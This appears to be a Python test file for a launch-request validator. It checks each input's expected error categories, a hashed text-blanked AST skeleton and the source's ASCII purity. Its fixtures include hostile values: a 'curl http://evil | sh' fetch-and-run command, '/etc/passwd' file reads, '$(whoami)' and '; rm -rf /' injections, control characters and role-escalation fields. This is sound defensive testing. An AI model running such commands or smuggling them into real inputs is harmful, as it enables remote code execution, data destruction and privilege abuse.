

def _parity_battery():
    NUL = chr(0x00)
    RLO = chr(0x202E)
    # (label, payload_factory, ctx_kwargs)
    return [
        ("valid_authed", lambda: {"proposed_name": "Clean Name", "category": "marketplace"},
         dict(authenticated=True, requester_handle="alice")),
        ("valid_dataclass", lambda: LaunchRequest(proposed_name="Clean", category="marketplace",
                                                  problem_statement="ok",
                                                  reference_urls=["https://example.com/a"]),
         dict(authenticated=True)),
        ("valid_invite", lambda: {"proposed_name": "X", "category": "marketplace"},
         dict(invite_token_verified=True)),
        ("unauthenticated", lambda: {"proposed_name": "X", "category": "marketplace"}, dict()),
        ("missing_name", lambda: {"category": "marketplace"}, dict(authenticated=True)),
        ("unknown_field", lambda: {"proposed_name": "X", "category": "marketplace", "surprise": "v"},
         dict(authenticated=True)),
        ("unknown_field_hostile_key",
         lambda: {"proposed_name": "X", "category": "marketplace", "ev" + NUL + "il": "v"},
         dict(authenticated=True)),
        ("auth_field_authenticated",
         lambda: {"proposed_name": "X", "category": "marketplace", "authenticated": True},
         dict(authenticated=True)),
        ("auth_field_role", lambda: {"proposed_name": "X", "category": "marketplace", "role": "admin"},
         dict(authenticated=True)),
        ("auth_field_sep",
         lambda: {"proposed_name": "X", "category": "marketplace", "invite-token-verified": True},
         dict(authenticated=True)),
        ("authority_807_repo",
         lambda: {"proposed_name": "X", "category": "marketplace", "create_repo": True},
         dict(authenticated=True)),
        ("authority_807_srcauth",
         lambda: {"proposed_name": "X", "category": "marketplace", "source_authority": "external_proto"},
         dict(authenticated=True)),
        ("authority_807_exec",
         lambda: {"proposed_name": "X", "category": "marketplace", "exec": "curl http://evil | sh"},
         dict(authenticated=True)),
        ("refurl_file",
         lambda: {"proposed_name": "X", "category": "marketplace", "reference_urls": ["file:///etc/passwd"]},
         dict(authenticated=True)),
        ("refurl_local",
         lambda: {"proposed_name": "X", "category": "marketplace", "reference_urls": ["/etc/passwd"]},
         dict(authenticated=True)),
        ("refurl_metachar",
         lambda: {"proposed_name": "X", "category": "marketplace",
                  "reference_urls": ["https://x.com/$(whoami)"]}, dict(authenticated=True)),
        ("refurl_semicolon",
         lambda: {"proposed_name": "X", "category": "marketplace",
                  "reference_urls": ["https://x.com/a; rm -rf /"]}, dict(authenticated=True)),
        ("refurl_nonstring",
         lambda: {"proposed_name": "X", "category": "marketplace", "reference_urls": [123]},
         dict(authenticated=True)),
        ("refurl_empty",
         lambda: {"proposed_name": "X", "category": "marketplace", "reference_urls": [""]},
         dict(authenticated=True)),
        ("refurl_nonascii",
         lambda: {"proposed_name": "X", "category": "marketplace",
                  "reference_urls": ["https://x.com/caf" + chr(0xe9)]}, dict(authenticated=True)),
        ("display_control_name",
         lambda: LaunchRequest(proposed_name="Good" + NUL + "Name", category="marketplace"),
         dict(authenticated=True)),
        ("display_control_rlo",
         lambda: {"proposed_name": "Good" + RLO + "Name", "category": "marketplace"},
         dict(authenticated=True)),
        ("display_nonstring", lambda: {"proposed_name": 123, "category": "marketplace"},
         dict(authenticated=True)),
        ("combo_unauth_unknown_authfield",
         lambda: {"proposed_name": "X", "category": "marketplace", "surprise": "v", "role": "admin"},
         dict()),
        ("clean_two_urls",
         lambda: {"proposed_name": "X", "category": "marketplace",
                  "reference_urls": ["https://example.com/a", "http://example.org/b"]},
         dict(authenticated=True)),
    ]


# Checked-in expected (ok, ORDERED category-label list) for every _parity_battery
# input. This is the SELF-CONTAINED baseline (replaces the old origin/main load).
#
# To regenerate after a DELIBERATE rule/outcome change (NOT a text-only reword):
#   python -c "import importlib.util as u; \
#     s=u.spec_from_file_location('t','<this file>'); m=u.module_from_spec(s); \
#     s.loader.exec_module(m); \
#     from modules.ai_intelligence.ai_overseer.src.foundup_genesis.launch_request \
#       import validate_launch_request as v, LaunchRequestIntakeContext as C; \
#     [print(repr(l), r.ok, [m._categorize(e) for e in r.errors]) \
#       for l,f,k in m._parity_battery() for r in [v(f(), C(**k))]]"
# A reword-only change must NOT alter this map; a logic change MUST update it here.
_EXPECTED_PARITY = {
    "valid_authed": (True, []),
    "valid_dataclass": (True, []),
    "valid_invite": (True, []),
    "unauthenticated": (False, ["intake_gate"]),
    "missing_name": (False, ["required_field", "display_type"]),
    "unknown_field": (False, ["unknown_or_forbidden_field"]),
    "unknown_field_hostile_key": (False, ["unknown_or_forbidden_field", "authority_807"]),
    "auth_field_authenticated": (False, ["unknown_or_forbidden_field", "auth_authority_field"]),
    "auth_field_role": (False, ["unknown_or_forbidden_field", "auth_authority_field"]),
    "auth_field_sep": (False, ["unknown_or_forbidden_field", "auth_authority_field"]),
    "authority_807_repo": (False, ["unknown_or_forbidden_field", "authority_807"]),
    "authority_807_srcauth": (False, ["unknown_or_forbidden_field", "authority_807"]),
    "authority_807_exec": (False, ["unknown_or_forbidden_field", "authority_807"]),
    "refurl_file": (False, ["reference_url_scheme"]),
    "refurl_local": (False, ["reference_url_scheme"]),
    "refurl_metachar": (False, ["reference_url_metachar"]),
    "refurl_semicolon": (False, ["reference_url_metachar"]),
    "refurl_nonstring": (False, ["reference_url_type"]),
    "refurl_empty": (False, ["reference_url_type"]),
    "refurl_nonascii": (False, ["reference_url_type"]),
    "display_control_name": (False, ["display_control_char"]),
    "display_control_rlo": (False, ["display_control_char"]),
    "display_nonstring": (False, ["display_type"]),
    "combo_unauth_unknown_authfield":
        (False, ["unknown_or_forbidden_field", "unknown_or_forbidden_field",
                 "auth_authority_field", "intake_gate"]),
    "clean_two_urls": (True, []),
}


def test_error_category_parity_self_contained():
    """PRIMARY parity guard (self-contained; no git / origin/main / subprocess / network).
    For each battery input, HEAD's (ok, ORDERED category labels) must equal the CHECKED-IN
    expectation. Count alone is insufficient -- the ORDERED category list is compared. Error
    TEXT may differ (reworded sites); the rule CATEGORY and ok must not. This RUNS+PASSES in
    CI with zero skips."""
    # The battery and the expectation must enumerate exactly the same labels.
    battery_labels = [label for label, _f, _k in _parity_battery()]
    assert set(battery_labels) == set(_EXPECTED_PARITY), \
        "parity battery and _EXPECTED_PARITY are out of sync -- update both together"
    divergences = []
    for label, factory, ctxkw in _parity_battery():
        res = validate_launch_request(factory(), LaunchRequestIntakeContext(**ctxkw))
        cats = [_categorize(e) for e in res.errors]
        unclassified = [c for c in cats if c.startswith("UNCLASSIFIED")]
        exp_ok, exp_cats = _EXPECTED_PARITY[label]
        if res.ok != exp_ok or cats != exp_cats or unclassified:
            divergences.append((label, res.ok, exp_ok, cats, exp_cats, unclassified))
    assert not divergences, f"category-parity divergences (HEAD vs checked-in expected): {divergences}"


def test_error_category_message_only_no_raw_key_echo():
    """Direct, SELF-CONTAINED evidence the slice is MESSAGE-only at the reworded unknown-field
    site: HEAD maps an unknown key to the stable `unknown_or_forbidden_field` category WITHOUT
    echoing the raw key into the launch_request-LOCAL message (the #824/#823 no-raw-echo intent).
    The old test proved this by diffing against origin/main; this proves it against HEAD itself."""
    payload = {"proposed_name": "X", "category": "marketplace", "bad_unknown_field": "v"}
    res = validate_launch_request(dict(payload), LaunchRequestIntakeContext(authenticated=True))
    assert not res.ok
    head_unknown = [e for e in res.errors if _categorize(e) == "unknown_or_forbidden_field"]
    assert head_unknown, "expected an unknown_or_forbidden_field category error"
    # Category is stable; the launch_request-LOCAL message does NOT echo the raw key.
    local_unknown = [e for e in _launch_request_local_errors(res.errors)
                     if _categorize(e) == "unknown_or_forbidden_field"]
    assert local_unknown, "expected a launch_request-local unknown-field error"
    assert all("bad_unknown_field" not in e for e in local_unknown), \
        "launch_request-local unknown-field message must NOT echo the raw key"


# ===========================================================================
# AST SKELETON PARITY -- structural backstop; message TEXT only, NO logic change.
#
# SELF-CONTAINED (SENTINEL CI-robustness): parse the CURRENT launch_request.py,
# blank EVERY string/f-string constant, and assert the resulting skeleton matches a
# CHECKED-IN expected hash. With all text blanked, only control flow / calls /
# branches remain -- so a reword-only change leaves the skeleton (and hash)
# unchanged, while any LOGIC change forces a conscious update of the expected hash.
# This RUNS+PASSES in CI with zero skips (no git / origin/main / subprocess).
#
# The expected hash was captured from the message-only HEAD, which is BYTE-IDENTICAL
# to origin/main's blanked skeleton (verified at slice time) -- i.e. this checked-in
# value IS the origin baseline, frozen, with no runtime git dependency.
# To regenerate after a DELIBERATE logic change:
#   python -c "import ast,hashlib;
#     from pathlib import Path;
#     src=Path('modules/ai_intelligence/ai_overseer/src/foundup_genesis/launch_request.py').read_text(encoding='utf-8');
#     ... (same _Blanker/_skeleton as below) ...; print(hashlib.sha256(skeleton.encode()).hexdigest())"
_EXPECTED_SKELETON_SHA256 = "05b00bb10401683580035ca470f8043738e7eed5588d86182cb7e8ca19eeab5a"


def _blanked_skeleton(src: str) -> str:
    """AST dump of `src` with every string/f-string constant replaced by '<BLANK>'.
    Leaves structure (control flow, calls, branches) intact while erasing message TEXT."""
    class _Blanker(ast.NodeTransformer):
        def visit_Constant(self, node):
            return ast.copy_location(ast.Constant(value="<BLANK>"), node)

        def visit_JoinedStr(self, node):
            return ast.copy_location(ast.Constant(value="<BLANK>"), node)

    tree = _Blanker().visit(ast.parse(src))
    ast.fix_missing_locations(tree)
    return ast.dump(tree, include_attributes=False)


def test_ast_skeleton_parity_self_consistent():
    """STRUCTURAL backstop (self-contained): the text-blanked AST skeleton of the CURRENT
    launch_request.py must hash to the checked-in baseline. Proves the slice is message-only
    (same control flow / calls / branches). Any logic change breaks this and must consciously
    update _EXPECTED_SKELETON_SHA256."""
    import hashlib
    head_src = MODULE_SRC.read_text(encoding="utf-8")
    actual = hashlib.sha256(_blanked_skeleton(head_src).encode("utf-8")).hexdigest()
    assert actual == _EXPECTED_SKELETON_SHA256, (
        "AST skeleton (text blanked) diverged from checked-in baseline -- a non-text (logic) "
        "change was introduced (or regenerate _EXPECTED_SKELETON_SHA256 if intended). "
        f"actual={actual}"
    )


def test_source_file_is_pure_ascii():
    # ASCII byte-check (Addendum: ASCII_CLEAN). The edited source must be 0 non-ASCII bytes;
    # every hostile/Unicode fixture is built via chr()/\uXXXX, not literal codepoints.
    raw = MODULE_SRC.read_bytes()
    non_ascii = [(i, b) for i, b in enumerate(raw) if b > 0x7F]
    assert not non_ascii, f"non-ASCII bytes in launch_request.py: {non_ascii[:5]}"
